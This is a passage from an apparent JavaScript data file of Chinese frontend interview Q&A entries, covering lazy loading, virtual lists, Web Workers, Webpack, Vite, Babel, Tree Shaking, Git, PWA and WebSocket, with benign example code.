- \`defer\`：不阻塞解析，DOMContentLoaded 前执行
- \`async\`：不阻塞解析，下载完立即执行
- 避免长任务（> 50ms）

**3. 减少重排重绘**
- 使用 transform/opacity 做动画
- 批量 DOM 操作
- 使用 will-change

**4. 虚拟列表**
\`\`\`javascript
// react-window
import { FixedSizeList } from 'react-window'
<FixedSizeList height={600} itemCount={10000} itemSize={35}>
  {Row}
</FixedSizeList>
\`\`\`

### 图片优化

\`\`\`html
<!-- 响应式图片 -->
<img src="small.jpg" 
     srcset="medium.jpg 768w, large.jpg 1200w"
     sizes="(max-width: 768px) 100vw, 50vw">

<!-- 现代格式 -->
<picture>
  <source srcset="image.avif" type="image/avif">
  <source srcset="image.webp" type="image/webp">
  <img src="image.jpg">
</picture>
\`\`\`

### 构建优化

\`\`\`javascript
// Vite 构建
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom'],
          utils: ['lodash-es', 'dayjs']
        }
      }
    },
    minify: 'terser',
    cssCodeSplit: true
  }
})
\`\`\`

### 性能指标

| 指标 | 含义 | 目标 |
|------|------|------|
| FCP | 首次内容绘制 | < 1.8s |
| LCP | 最大内容绘制 | < 2.5s |
| FID | 首次输入延迟 | < 100ms |
| CLS | 累积布局偏移 | < 0.1 |
| TTI | 可交互时间 | < 3.8s |

### 检测工具
- Chrome DevTools → Performance / Lighthouse
- WebPageTest
- Core Web Vitals（Search Console）`
  },
  {
    id: 'be-013',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['懒加载', 'IntersectionObserver', '图片'],
    question: '图片懒加载的实现方案？IntersectionObserver 怎么用？',
    answer: `### 方案 1：原生 loading 属性（最简单）

\`\`\`html
<img src="image.jpg" loading="lazy" alt="..." />
\`\`\`

- 浏览器原生支持，零 JS
- 兼容性：Chrome 76+、Firefox 75+、Safari 15.4+
- 简单场景推荐

### 方案 2：IntersectionObserver（推荐）

\`\`\`javascript
const images = document.querySelectorAll('img[data-src]')

const observer = new IntersectionObserver((entries, obs) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target
      img.src = img.dataset.src  // 加载真实图片
      img.removeAttribute('data-src')
      obs.unobserve(img)         // 加载后取消观察
    }
  })
}, {
  rootMargin: '200px'  // 提前 200px 开始加载
})

images.forEach(img => observer.observe(img))
\`\`\`

\`\`\`html
<img data-src="image.jpg" src="placeholder.jpg" alt="..." />
\`\`\`

### IntersectionObserver API

\`\`\`javascript
const observer = new IntersectionObserver(callback, options)

// options
{
  root: null,         // 视口（默认）或指定容器
  rootMargin: '0px',  // 根元素的 margin
  threshold: 0.1      // 交叉比例达到 10% 时触发
}

// callback
(entries) => {
  entries.forEach(entry => {
    entry.isIntersecting  // 是否可见
    entry.intersectionRatio  // 交叉比例 0~1
    entry.target  // 被观察的元素
  })
}

// 方法
observer.observe(el)      // 开始观察
observer.unobserve(el)    // 停止观察
observer.disconnect()     // 停止所有观察
\`\`\`

### 方案 3：scroll 事件 + getBoundingClientRect（传统）

\`\`\`javascript
function lazyLoad() {
  const images = document.querySelectorAll('img[data-src]')
  const scrollTop = window.pageYOffset
  const windowHeight = window.innerHeight
  
  images.forEach(img => {
    if (img.offsetTop < scrollTop + windowHeight + 200) {
      img.src = img.dataset.src
      img.removeAttribute('data-src')
    }
  })
}

window.addEventListener('scroll', throttle(lazyLoad, 200))
lazyLoad() // 初始检查
\`\`\`

⚠️ 性能差：scroll 事件频繁触发，\`offsetTop\` 触发重排

### 应用场景

1. **图片懒加载**
2. **无限滚动列表**
3. **组件懒渲染**（滚到可见区域才渲染）
4. **广告/视频按需加载**
5. **动画触发**（元素进入视口时播放）

\`\`\`javascript
// 无限滚动
const observer = new IntersectionObserver(([entry]) => {
  if (entry.isIntersecting) {
    loadMore()
  }
})
observer.observe(document.querySelector('.sentinel'))
\`\`\`

### 最佳实践
- 简单场景 → \`loading="lazy"\`
- 需要控制加载时机 → IntersectionObserver
- 兼容旧浏览器 → polyfill 或 scroll 方案
- 搭配占位图/骨架屏提升体验`
  },
  {
    id: 'be-014',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['虚拟列表', '性能', '大数据'],
    question: '什么是虚拟列表？如何实现？',
    answer: `虚拟列表只渲染**可视区域**内的元素，而非全部，适用于大数据列表。

### 原理

\`\`\`
容器高度: 600px
每项高度: 50px
可见项数: 600 / 50 = 12

总数据: 10000 条
实际渲染: ~15 条（12 + 上下缓冲）

┌──────────────────┐
│  ↑ 偏移量(padding)│
├──────────────────┤
│  Item 3          │ ← 可见区域
│  Item 4          │
│  Item 5          │
│  ...             │
│  Item 14         │ ← 可见区域
├──────────────────┤
│  ↓ 偏移量(padding)│
└──────────────────┘
\`\`\`

### 实现核心

\`\`\`javascript
import { useState, useRef, useEffect, useMemo } from 'react'

function VirtualList({ items, itemHeight, visibleHeight }) {
  const [scrollTop, setScrollTop] = useState(0)
  const containerRef = useRef(null)

  // 可见项数量
  const visibleCount = Math.ceil(visibleHeight / itemHeight)

  // 开始索引（加上上方缓冲）
  const startIndex = Math.max(0, Math.floor(scrollTop / itemHeight) - 3)
  
  // 结束索引（加上下方缓冲）
  const endIndex = Math.min(
    items.length,
    startIndex + visibleCount + 6
  )

  // 偏移量
  const offsetY = startIndex * itemHeight

  // 总高度
  const totalHeight = items.length * itemHeight

  const handleScroll = (e) => {
    setScrollTop(e.target.scrollTop)
  }

  return (
    <div 
      ref={containerRef}
      style={{ height: visibleHeight, overflow: 'auto' }}
      onScroll={handleScroll}
    >
      <div style={{ height: totalHeight, position: 'relative' }}>
        <div style={{ transform: \`translateY(\${offsetY}px)\` }}>
          {items.slice(startIndex, endIndex).map((item, i) => (
            <div key={startIndex + i} style={{ height: itemHeight }}>
              {item.content}
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}
\`\`\`

### 动态高度的虚拟列表

当每项高度不固定时，需要维护位置缓存：

\`\`\`javascript
function DynamicVirtualList({ items, estimatedHeight }) {
  const [positions, setPositions] = useState(
    items.map((_, i) => ({
      index: i,
      top: i * estimatedHeight,
      bottom: (i + 1) * estimatedHeight,
      height: estimatedHeight
    }))
  )

  // 测量真实高度后更新 positions
  const updateHeight = (index, height) => {
    setPositions(prev => {
      const newPositions = [...prev]
      const oldHeight = newPositions[index].height
      const diff = height - oldHeight
      newPositions[index].height = height
      newPositions[index].bottom = newPositions[index].top + height
      // 更新后续所有位置
      for (let i = index + 1; i < newPositions.length; i++) {
        newPositions[i].top = newPositions[i - 1].bottom
        newPositions[i].bottom = newPositions[i].top + newPositions[i].height
      }
      return newPositions
    })
  }

  // 二分查找 startIndex
  const findIndex = (scrollTop) => {
    let start = 0, end = positions.length - 1
    while (start < end) {
      const mid = Math.floor((start + end) / 2)
      if (positions[mid].bottom < scrollTop) start = mid + 1
      else end = mid
    }
    return start
  }
}
\`\`\`

### 现成库

\`\`\`javascript
// react-window（推荐）
import { FixedSizeList, VariableSizeList } from 'react-window'

// 固定高度
<FixedSizeList height={600} itemCount={10000} itemSize={50} width="100%">
  {({ index, style }) => (
    <div style={style}>Item {index}</div>
  )}
</FixedSizeList>

// 动态高度
<VariableSizeList height={600} itemCount={10000} 
  itemSize={i => items[i].height} width="100%">
  {({ index, style }) => <div style={style}>Item {index}</div>}
</VariableSizeList>

// Vue: vue-virtual-scroller
// Angular: @angular/cdk/scrolling
\`\`\`

### 适用场景
- 万级数据列表
- 聊天记录
- 表格数据
- 时间线/日志`
  },
  {
    id: 'be-015',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['WebWorker', '多线程', '性能'],
    question: 'Web Worker 是什么？如何使用？有什么限制？',
    answer: `### Web Worker

JavaScript 是单线程的，Web Worker 允许在**后台线程**中运行 JS，不阻塞主线程。

### 基本使用

**主线程：**
\`\`\`javascript
// 创建 Worker
const worker = new Worker('worker.js')

// 发送数据
worker.postMessage({ command: 'calculate', data: [1, 2, 3] })

// 接收 Worker 返回的数据
worker.onmessage = (e) => {
  console.log('结果:', e.data)
}

// 错误处理
worker.onerror = (e) => {
  console.error('Worker error:', e.message)
}

// 终止
worker.terminate()
\`\`\`

**Worker 线程（worker.js）：**
\`\`\`javascript
// 接收主线程数据
self.onmessage = (e) => {
  const { command, data } = e.data
  
  if (command === 'calculate') {
    const result = heavyComputation(data)
    // 发送结果回主线程
    self.postMessage(result)
  }
}

function heavyComputation(data) {
  // 耗时计算...
  return data.reduce((sum, n) => sum + n, 0)
}
\`\`\`

### 使用场景

1. **大量计算**：图像处理、加密、排序
2. **数据处理**：解析大 JSON、CSV
3. **后台轮询**：实时数据获取
4. **离线缓存处理**

\`\`\`javascript
// 内联 Worker（不需要单独文件）
const workerCode = \`
  self.onmessage = (e) => {
    const result = e.data * 2
    self.postMessage(result)
  }
\`
const blob = new Blob([workerCode], { type: 'application/javascript' })
const worker = new Worker(URL.createObjectURL(blob))
\`\`\`

### SharedWorker（多标签页共享）

\`\`\`javascript
// 多个标签页共享同一个 Worker
const sharedWorker = new SharedWorker('shared-worker.js')
sharedWorker.port.onmessage = (e) => console.log(e.data)
sharedWorker.port.postMessage('hello')
\`\`\`

### Worker 的限制

| 特性 | 支持 |
|------|------|
| DOM 操作 | ❌ |
| window 对象 | ❌（用 self）|
| XMLHttpRequest | ✅ |
| fetch | ✅ |
| WebSocket | ✅ |
| IndexedDB | ✅ |
| setTimeout/setInterval | ✅ |
| importScripts() | ✅（引入其他脚本）|
| console.log | ✅ |
| location/navigator | ✅（只读）|

### Transferable Objects（零拷贝传输）

\`\`\`javascript
// ArrayBuffer 可以零拷贝转移（原线程不能再使用）
const buffer = new ArrayBuffer(1024 * 1024)
worker.postMessage(buffer, [buffer]) // 第二个参数是 transfer list
console.log(buffer.byteLength) // 0（已转移）
\`\`\`

### 性能注意
- Worker 创建有开销，不适合太短的任务
- postMessage 有序列化开销（Transferable Objects 除外）
- Worker 不能直接操作 DOM，必须通过 postMessage 通信

### 实际应用示例

\`\`\`javascript
// 大数据排序
worker.postMessage({ data: hugeArray })
// 主线程仍然流畅

// 实时图像处理
const canvas = document.querySelector('canvas')
const imageData = canvas.getContext('2d').getImageData(0, 0, w, h)
worker.postMessage(imageData, [imageData.data.buffer])
// Worker 处理后返回新的 imageData
\`\`\`

### 主线程替代方案
对于不需要真正多线程的场景，可以用以下方式避免阻塞：
- \`requestIdleCallback\`：空闲时执行
- \`setTimeout(0)\`：将任务拆分到不同事件循环
- \`Promise.resolve().then()\`：微任务中执行

### 推荐场景
- 任务执行时间 > 100ms → 考虑 Worker
- 任务 < 50ms → 主线程即可`
  },

  // ========== 构建工具 ==========
  {
    id: 'be-016',
    category: 'build',
    module: 'build',
    difficulty: 'medium',
    tags: ['Webpack', '构建工具', '打包'],
    question: 'Webpack 的核心概念是什么？常用配置有哪些？',
    answer: `### 核心概念

| 概念 | 说明 |
|------|------|
| Entry | 入口文件 |
| Output | 输出配置 |
| Loader | 处理非 JS 文件（CSS、图片等）|
| Plugin | 扩展功能（压缩、HTML 生成等）|
| Mode | development/production |
| Module | 一切皆模块 |

### 基本配置

\`\`\`javascript
const path = require('path')
const HtmlWebpackPlugin = require('html-webpack-plugin')

module.exports = {
  mode: 'production',
  entry: './src/index.js',
  output: {
    path: path.resolve(__dirname, 'dist'),
    filename: '[name].[contenthash:8].js',
    clean: true
  },
  
  // Loader
  module: {
    rules: [
      {
        test: /\.css$/,
        use: ['style-loader', 'css-loader', 'postcss-loader']
      },
      {
        test: /\.js$/,
        exclude: /node_modules/,
        use: {
          loader: 'babel-loader',
          options: { presets: ['@babel/preset-env'] }
        }
      },
      {
        test: /\.(png|jpg|svg)$/,
        type: 'asset/resource'  // Webpack 5 内置
      }
    ]
  },
  
  // Plugin
  plugins: [
    new HtmlWebpackPlugin({ template: './index.html' })
  ],
  
  // 优化
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          chunks: 'all'
        }
      }
    }
  },
  
  // 开发服务器
  devServer: {
    hot: true,
    port: 3000,
    proxy: {
      '/api': 'http://localhost:8080'
    }
  }
}
\`\`\`

### Loader 执行顺序

从右到左、从下到上：
\`\`\`javascript
use: ['style-loader', 'css-loader', 'postcss-loader']
// 执行顺序: postcss-loader → css-loader → style-loader
\`\`\`

### 常用 Plugin

| Plugin | 作用 |
|--------|------|
| HtmlWebpackPlugin | 自动生成 HTML 并引入 JS |
| MiniCssExtractPlugin | 提取 CSS 到单独文件 |
| CssMinimizerPlugin | 压缩 CSS |
| DefinePlugin | 定义环境变量 |
| CopyWebpackPlugin | 复制静态文件 |
| BundleAnalyzerPlugin | 分析包体积 |

### Webpack 5 新特性

1. **模块联邦**（Module Federation）：微前端
2. **资源模块**：内置图片/字体处理
3. **缓存**：持久化文件系统缓存
4. **Node Polyfill 移除**：不再自动 polyfill

### 构建优化

\`\`\`javascript
// 持久化缓存
module.exports = {
  cache: {
    type: 'filesystem'
  }
}

// 代码分割
optimization: {
  splitChunks: {
    chunks: 'all'
  }
}

// Tree Shaking（生产模式自动）
// 副作用标记
// package.json: "sideEffects": false
\`\`\`

### 与 Vite 对比

| 特性 | Webpack | Vite |
|------|---------|------|
| 开发启动 | 慢（全量打包）| 快（ESM 原生）|
| HMR | 快 | 极快 |
| 构建 | Webpack 打包 | Rollup 打包 |
| 生态 | 最丰富 | 快速增长 |
| 配置 | 复杂 | 简单 |`
  },
  {
    id: 'be-017',
    category: 'build',
    module: 'build',
    difficulty: 'medium',
    tags: ['Vite', '构建工具', 'ESM'],
    question: 'Vite 的工作原理是什么？和 Webpack 有什么区别？',
    answer: `### Vite 的核心优势

**开发阶段**：利用浏览器原生 ESM，按需加载模块，无需打包。

### 开发阶段原理

\`\`\`
浏览器请求 index.html
  → Vite 拦截 <script type="module" src="/src/main.js">
  → 按需编译每个模块
  → 浏览器通过 ESM import 链按需加载
  → 修改文件时只热更新对应模块
\`\`\`

\`\`\`javascript
// Vite dev server 拦截请求
// 请求 /src/main.js → Vite 编译 → 返回 ESM 格式
import { createApp } from 'vue'  // → /node_modules/.vite/vue.js
import App from './App.vue'      // → 编译 SFC 为 JS
\`\`\`

### 依赖预构建

Vite 使用 esbuild 预构建依赖（CJS → ESM）：

\`\`\`
首次启动：
  1. 扫描 import 语句找到依赖
  2. esbuild 预构建（比 Webpack 快 10-100 倍）
  3. 缓存到 node_modules/.vite
  4. 后续请求直接用缓存
\`\`\`

### 生产构建

开发用 ESM，但生产环境用 Rollup 打包：
\`\`\`javascript
// vite.config.js
import { defineConfig } from 'vite'
import vue from '@vitejs/plugin-vue'

export default defineConfig({
  plugins: [vue()],
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['vue', 'vue-router'],
          ui: ['element-plus']
        }
      }
    }
  }
})
\`\`\`

### 为什么开发用 ESM 而生产用打包？

- **开发**：ESM 按需加载，启动快，HMR 精准
- **生产**：打包减少请求数、Tree Shaking、代码压缩

### HMR 原理

\`\`\`
1. 文件修改 → Vite 监听变化
2. 找到受影响的模块
3. 通过 WebSocket 通知浏览器
4. 浏览器重新请求变化的模块
5. 替换模块，保留应用状态
\`\`\`

### Vite 配置

\`\`\`javascript
import { defineConfig } from 'vite'
import vue from '@vitejs/plugin-vue'

export default defineConfig({
  plugins: [vue()],
  
  // 路径别名
  resolve: {
    alias: {
      '@': '/src'
    }
  },
  
  // 开发服务器
  server: {
    port: 3000,
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true
      }
    }
  },
  
  // CSS 预处理器
  css: {
    preprocessorOptions: {
      scss: { additionalData: '@import "@/styles/variables.scss";' }
    }
  },
  
  // 环境变量
  define: {
    __APP_VERSION__: JSON.stringify('1.0.0')
  }
})
\`\`\`

### Webpack vs Vite

| 特性 | Webpack | Vite |
|------|---------|------|
| 开发启动 | 全量打包，慢 | ESM 按需，极快 |
| 大项目启动 | 30s-2min | < 1s |
| HMR | 全模块链 | 精准单模块 |
| 配置 | 复杂 | 简单 |
| 生产打包 | Webpack | Rollup |
| 生态 | 最丰富 | 足够 |
| 学习曲线 | 高 | 低 |

### Vite 插件生态

\`\`\`javascript
import vue from '@vitejs/plugin-vue'        // Vue SFC
import react from '@vitejs/plugin-react'     // React Fast Refresh
import legacy from '@vitejs/plugin-legacy'   // 旧浏览器兼容
import { visualizer } from 'rollup-plugin-visualizer' // 包分析
\`\`\`

### 什么时候选 Vite
- 新项目（Vue/React/纯 TS）
- 追求开发体验
- 不需要兼容旧浏览器

### 什么时候选 Webpack
- 老项目迁移成本高
- 依赖 Webpack 特有插件
- 复杂的 Module Federation 场景`
  },
  {
    id: 'be-018',
    category: 'build',
    module: 'build',
    difficulty: 'medium',
    tags: ['Babel', '转译', 'polyfill'],
    question: 'Babel 的作用是什么？preset 和 plugin 的关系？',
    answer: `### Babel 是什么

Babel 是 JavaScript 编译器，将 ES6+ 代码转译为兼容旧浏览器的 ES5 代码。

### 工作流程

\`\`\`
源代码 → Parse(解析AST) → Transform(转换AST) → Generate(生成代码)
\`\`\`

### preset 和 plugin

**plugin**：单个转换功能
**preset**：一组 plugin 的集合

\`\`\`json
// .babelrc / babel.config.json
{
  "presets": [
    "@babel/preset-env",      // 根据 browserslist 自动选择 plugin
    "@babel/preset-react",     // JSX → JS
    "@babel/preset-typescript" // TS → JS
  ],
  "plugins": [
    "@babel/plugin-proposal-optional-chaining", // ?.
    ["@babel/plugin-proposal-decorators", { "legacy": true }]
  ]
}
\`\`\`

### @babel/preset-env

\`\`\`json
{
  "presets": [
    [
      "@babel/preset-env",
      {
        "targets": {
          "chrome": "60",
          "firefox": "60",
          "safari": "11"
        },
        "useBuiltIns": "usage",  // 按需 polyfill
        "corejs": 3
      }
    ]
  ]
}
\`\`\`

**useBuiltIns 选项：**
- \`false\`：不注入 polyfill
- \`entry\`：在入口文件全量引入
- \`usage\`：按代码使用情况按需引入（推荐）

### 转译示例

\`\`\`javascript
// 源代码
const fn = (a = 1, ...rest) => ({ a, ...rest })
class Person { #name = 'Tom' }

// 转译后（简化）
var fn = function fn() {
  var a = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 1
  // ...
}
function _defineProperties(target, props) { /*...*/ }
var Person = function Person() {
  Object.defineProperty(this, '_name', { value: 'Tom', writable: true })
}
\`\`\`

### polyfill vs transform

| 方式 | 作用 | 示例 |
|------|------|------|
| transform | 语法转译 | 箭头函数 → function |
| polyfill | API 补丁 | Promise、Array.includes |

\`\`\`javascript
// transform：语法转译
const fn = () => {}  →  var fn = function() {}

// polyfill：API 补丁（需要额外引入 core-js）
Array.prototype.includes  →  需要安装 polyfill
Promise                   →  需要安装 polyfill
\`\`\`

### Babel 配置最佳实践

\`\`\`javascript
// babel.config.js
module.exports = {
  presets: [
    ['@babel/preset-env', {
      targets: '> 0.25%, not dead',
      useBuiltIns: 'usage',
      corejs: 3
    }],
    '@babel/preset-react',
    '@babel/preset-typescript'
  ],
  plugins: [
    // Stage 3+ 提案
    ['@babel/plugin-proposal-decorators', { legacy: true }],
    '@babel/plugin-proposal-class-properties'
  ]
}
\`\`\`

### browserslist

\`\`\`
# .browserslistrc
> 0.5%
last 2 versions
not dead
not ie 11
\`\`\`

Babel、Autoprefixer、ESLint 等工具共用此配置。

### 现代替代方案
- **esbuild**：Go 编写，速度极快，但功能不如 Babel 全面
- **SWC**：Rust 编写，Next.js 默认使用
- Babel 仍然是生态最丰富的方案，但速度上不如 esbuild/SWC`
  },
  {
    id: 'be-019',
    category: 'build',
    module: 'build',
    difficulty: 'medium',
    tags: ['Tree Shaking', '摇树优化', '构建'],
    question: '什么是 Tree Shaking？如何确保它生效？',
    answer: `### Tree Shaking

**摇树优化**：打包时移除未使用的代码（死代码），减小包体积。

\`\`\`javascript
// math.js
export function add(a, b) { return a + b }
export function subtract(a, b) { return a - b }
export function multiply(a, b) { return a * b }

// app.js
import { add } from './math.js'
console.log(add(1, 2))

// 打包后：subtract 和 multiply 被移除
\`\`\`

### 工作原理

1. 依赖 **ESM 的静态结构**（import/export 在编译时确定）
2. 打包工具分析模块依赖关系
3. 标记未被导入的 export 为"未使用"
4. 压缩阶段移除未使用的代码

### 为什么 CommonJS 不能 Tree Shake

\`\`\`javascript
// CommonJS — 动态加载，无法静态分析
const math = require('./math')
const fn = process.env.TEST ? math.add : math.subtract  // 运行时决定

// ESM — 静态结构，编译时确定
import { add } from './math'  // 明确只用了 add
\`\`\`

### 确保 Tree Shaking 生效

**1. 使用 ESM**

\`\`\`javascript
// ✅ ES Module
import { debounce } from 'lodash-es'

// ❌ CommonJS（不触发 Tree Shaking）
import { debounce } from 'lodash'
\`\`\`

**2. package.json 配置 sideEffects**

\`\`\`json
{
  "name": "my-lib",
  "sideEffects": false  // 所有文件都没有副作用，可安全 Tree Shake
}
\`\`\`

或指定有副作用的文件：
\`\`\`json
{
  "sideEffects": ["*.css", "*.scss", "./src/polyfills.js"]
}
\`\`\`

**什么是副作用？**
\`\`\`javascript
// 有副作用：修改了全局状态
window.myGlobal = 'hello'
Array.prototype.myMethod = function() {}

// 无副作用：纯导入导出
export function add(a, b) { return a + b }
\`\`\`

**3. 生产模式**

\`\`\`javascript
// Webpack
mode: 'production'  // 自动开启 Tree Shaking

// Vite/Rollup
// 生产构建自动开启
\`\`\`

**4. 避免整包导入**

\`\`\`javascript
// ❌ 导入整个 lodash
import _ from 'lodash'
_.debounce(fn, 300)

// ✅ 按需导入
import debounce from 'lodash/debounce'
// 或
import { debounce } from 'lodash-es'  // 配合 Tree Shaking
\`\`\`

### 验证 Tree Shaking

\`\`\`bash
# Webpack
npx webpack --analyze

# Vite
vite build --mode production
# 查看包大小变化
\`\`\`

### 常见问题

**1. 函数有副作用导致无法摇除**
\`\`\`javascript
// ❌ 有副作用（访问了全局变量）
export function init() {
  console.log('init')  // 副作用
}

// ✅ 纯函数
export function add(a, b) {
  return a + b
}
\`\`\`

**2. 类的方法不会被摇除**
\`\`\`javascript
export class MyClass {
  unusedMethod() {}  // 不会被摇除（可能有副作用）
}
\`\`\`

**3. 动态导入无法静态分析**
\`\`\`javascript
const lib = await import(dynamicPath)  // ❌ 无法 Tree Shake
\`\`\`

### Webpack vs Vite Tree Shaking

两者都支持 Tree Shaking，Vite（Rollup）在 Tree Shaking 上通常更激进。`
  },
  {
    id: 'be-020',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['Git', '版本控制', '工作流'],
    question: 'Git 的常用命令和工作流程有哪些？',
    answer: `### 基本操作

\`\`\`bash
# 初始化与克隆
git init
git clone <url>

# 基本工作流
git status              # 查看状态
git add .              # 暂存所有
git add <file>          # 暂存指定文件
git commit -m "message" # 提交
git push origin main    # 推送
git pull origin main    # 拉取

# 查看历史
git log --oneline --graph
git diff               # 工作区 vs 暂存区
git diff --cached       # 暂存区 vs 最新提交
\`\`\`

### 分支操作

\`\`\`bash
git branch                    # 查看分支
git branch <name>             # 创建分支
git checkout <name>           # 切换分支
git checkout -b <name>        # 创建并切换
git switch <name>             # 切换（新命令）
git switch -c <name>          # 创建并切换

git merge <branch>            # 合并分支
git rebase <branch>           # 变基
git branch -d <name>          # 删除分支
git branch -D <name>          # 强制删除
\`\`\`

### 撤销操作

\`\`\`bash
git checkout -- <file>        # 撤销工作区修改
git restore <file>            # 同上（新命令）
git reset HEAD <file>         # 撤销暂存
git restore --staged <file>   # 同上（新命令）

git commit --amend            # 修改最后一次提交
git reset --soft HEAD~1       # 撤销提交，保留改动
git reset --hard HEAD~1       # 撤销提交，丢弃改动（危险）
git revert <commit>           # 创建反向提交（安全）
\`\`\`

### 合并 vs 变基

\`\`\`bash
# merge：保留分支历史
git checkout main
git merge feature
# ──●──●──●───● (main)
#     ╲     ╱
#      ●──● (feature)

# rebase：线性历史
git checkout feature
git rebase main
git checkout main
git merge feature
# ──●──●──●──●──● (main，线性)
\`\`\`

**rebase 金科玉律**：不要 rebase 已推送到远程的公共分支！

### 储藏（Stash）

\`\`\`bash
git stash               # 储藏当前改动
git stash save "msg"    # 带消息
git stash list          # 查看储藏列表
git stash pop           # 恢复并删除储藏
git stash apply         # 恢复但不删除
git stash drop          # 删除储藏
\`\`\`

### 远程操作

\`\`\`bash
git remote add origin <url>
git remote -v
git push -u origin main  # -u 设置上游
git push --force-with-lease  # 安全的强制推送

git fetch origin         # 获取但不合并
git pull --rebase origin main  # 拉取并变基
\`\`\`

### 常见工作流

**Git Flow：**
\`\`\`
main     ← 生产分支
develop  ← 开发分支
feature/* ← 功能分支
release/* ← 发布分支
hotfix/*  ← 紧急修复
\`\`\`

**GitHub Flow（简单）：**
\`\`\`
main ← 直接在 feature 分支开发 → PR → 合并到 main
\`\`\`

### 常见问题处理

\`\`\`bash
# 合并冲突
git merge feature
# 手动解决冲突文件
git add .
git commit

# 撤回已推送的提交
git revert <commit>
git push origin main

# 找回删除的分支
git reflog
git checkout <commit-hash>
git branch recovered <commit-hash>
\`\`\`

### .gitignore
\`\`\`
node_modules/
dist/
.env
*.log
.DS_Store
.vscode/
\`\`\``
  },

  // ========== 更多浏览器与工程化 ==========
  {
    id: 'be-021',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['PWA', 'Service Worker', '离线'],
    question: '什么是 PWA？Service Worker 的作用是什么？',
    answer: `### PWA（Progressive Web App）

渐进式 Web 应用，结合 Web 和原生应用的优点：
- 可安装（添加到主屏幕）
- 离线可用
- 推送通知
- 后台同步

### Service Worker

独立于主线程的后台脚本，充当浏览器与网络之间的**代理**。

**特点：**
- 在独立线程中运行
- 不能操作 DOM
- 可拦截网络请求
- 可使用 Cache API 和 IndexedDB
- 必须在 HTTPS 下运行

### 基本使用

**注册 Service Worker：**
\`\`\`javascript
// main.js
if ('serviceWorker' in navigator) {
  window.addEventListener('load', () => {
    navigator.serviceWorker.register('/sw.js')
      .then(reg => console.log('SW registered'))
      .catch(err => console.log('SW failed:', err))
  })
}
\`\`\`

**Service Worker 生命周期：**
\`\`\`javascript
// sw.js
const CACHE_NAME = 'v1'
const ASSETS = ['/', '/index.html', '/styles.css', '/app.js']

// 安装：预缓存资源
self.addEventListener('install', (e) => {
  e.waitUntil(
    caches.open(CACHE_NAME).then(cache => cache.addAll(ASSETS))
  )
  self.skipWaiting()  // 立即激活
})

// 激活：清理旧缓存
self.addEventListener('activate', (e) => {
  e.waitUntil(
    caches.keys().then(keys => 
      Promise.all(keys.filter(k => k !== CACHE_NAME).map(k => caches.delete(k)))
    )
  )
  self.clients.claim()
})

// 拦截请求
self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request).then(cached => {
      return cached || fetch(e.request).then(response => {
        // 缓存新资源
        const clone = response.clone()
        caches.open(CACHE_NAME).then(cache => cache.put(e.request, clone))
        return response
      }).catch(() => caches.match('/offline.html'))
    })
  )
})
\`\`\`

### 缓存策略

\`\`\`javascript
// 1. Cache First（适合静态资源）
async function cacheFirst(request) {
  const cached = await caches.match(request)
  return cached || fetch(request)
}

// 2. Network First（适合 API 请求）
async function networkFirst(request) {
  try {
    const response = await fetch(request)
    const clone = response.clone()
    const cache = await caches.open('api-cache')
    cache.put(request, clone)
    return response
  } catch {
    return caches.match(request)
  }
}

// 3. Stale While Revalidate（先缓存后更新）
async function staleWhileRevalidate(request) {
  const cache = await caches.open('dynamic')
  const cached = await cache.match(request)
  const fetchPromise = fetch(request).then(response => {
    cache.put(request, response.clone())
    return response
  })
  return cached || fetchPromise
}
\`\`\`

### manifest.json（可安装）

\`\`\`json
{
  "name": "My PWA",
  "short_name": "MyApp",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#4f46e5",
  "icons": [
    {
      "src": "/icon-192.png",
      "sizes": "192x192",
      "type": "image/png"
    }
  ]
}
\`\`\`

\`\`\`html
<link rel="manifest" href="/manifest.json">
\`\`\`

### 推送通知

\`\`\`javascript
// 请求权限
const permission = await Notification.requestPermission()

// 订阅推送
const reg = await navigator.serviceWorker.ready
const subscription = await reg.pushManager.subscribe({
  userVisibleOnly: true,
  applicationServerKey: VAPID_PUBLIC_KEY
})

// Service Worker 接收推送
self.addEventListener('push', (e) => {
  e.waitUntil(
    self.registration.showNotification('标题', {
      body: e.data.text(),
      icon: '/icon.png'
    })
  )
})
\`\`\`

### 适用场景
- ✅ 内容型网站（新闻、电商）
- ✅ 需要离线功能的应用
- ✅ 需要推送通知
- ❌ 需要复杂原生功能（蓝牙、NFC 等）`
  },
  {
    id: 'be-022',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['WebSocket', '实时通信', '网络'],
    question: 'WebSocket 和 HTTP 的区别？如何使用 WebSocket？',
    answer: `### WebSocket vs HTTP

| 特性 | HTTP | WebSocket |
|------|------|-----------|
| 通信方式 | 请求-响应 | 全双工 |
| 连接 | 短连接（HTTP/1.1 keep-alive）| 长连接 |
| 方向 | 单向（客户端→服务器）| 双向 |
| 协议 | http/https | ws/wss |
| 数据格式 | 文本 | 文本/二进制 |
| 开销 | 每次带完整 header | 握手后数据帧开销极小 |

### WebSocket 使用

**客户端：**
\`\`\`javascript
// 创建连接
const ws = new WebSocket('ws://localhost:8080')
// 或加密
const ws = new WebSocket('wss://localhost:8080')

// 事件
ws.onopen = () => {
  console.log('连接已建立')
  ws.send('Hello Server')
  ws.send(JSON.stringify({ type: 'message', data: 'hello' }))
}

ws.onmessage = (e) => {
  console.log('收到:', e.data)
}

ws.onerror = (e) => {
  console.log('错误:', e)
}

ws.onclose = (e) => {
  console.log('连接关闭:', e.code, e.reason)
}

// 主动关闭
ws.close(1000, '正常关闭')
\`\`\`

